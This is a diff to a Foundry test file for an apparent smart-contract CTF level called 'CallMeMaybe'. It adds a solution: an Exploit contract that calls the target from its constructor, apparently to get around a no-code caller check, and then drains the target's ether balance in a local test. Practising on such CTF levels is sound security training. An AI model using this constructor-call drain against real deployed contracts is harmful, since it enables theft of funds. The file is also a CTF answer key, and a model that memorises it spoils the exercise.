@@ -4,6 +4,21 @@ pragma solidity ^0.8.25;
 import "./BaseTest.t.sol";
 import "src/05_CallMeMaybe/CallMeMaybe.sol";
 
+contract Exploit {
+    CallMeMaybe public instance;
+
+    constructor(address payable _instanceAddr) payable {
+        instance = CallMeMaybe(_instanceAddr);
+        instance.hereIsMyNumber();
+    }
+
+    function withdraw() external {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    receive() external payable {}
+}
+
 // forge test --match-contract CallMeMaybeTest -vvvv
 contract CallMeMaybeTest is BaseTest {
     CallMeMaybe instance;
@@ -15,10 +30,17 @@ contract CallMeMaybeTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        vm.startPrank(user1);
+
+        Exploit exploit = new Exploit(payable(address(instance)));
+
+        exploit.withdraw();
+
+        vm.stopPrank();
 
         checkSuccess();
     }
+
 
     function checkSuccess() internal view override {
         assertTrue(address(instance).balance == 0, "Solution is not solving the level");
